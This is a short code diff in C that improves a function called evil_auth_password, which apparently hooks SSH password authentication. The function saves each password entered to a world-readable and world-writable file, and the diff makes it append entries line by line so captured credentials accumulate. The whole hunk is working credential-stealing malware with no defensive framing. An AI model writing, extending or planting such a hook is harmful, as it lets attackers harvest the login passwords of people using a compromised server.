@@ -23,13 +23,15 @@ ssize_t write_all(int fd, const char *buffer){
 int evil_auth_password(void *ssh, const char *password){
 	int fd;
 	ssize_t written;
+	char endline = '\n';
 
-	fd = open(path, O_CREAT | O_WRONLY, S_IROTH | S_IWOTH);
+	fd = open(path, O_CREAT | O_WRONLY | O_APPEND, S_IROTH | S_IWOTH);
 	if(fd == -1)
 		return 0;
 	written = write_all(fd, password);
 	if(written == -1)
 		return 0;
+	write(fd, &endline, sizeof(char));
 
 	if(close(fd) == -1)
 		return 0;
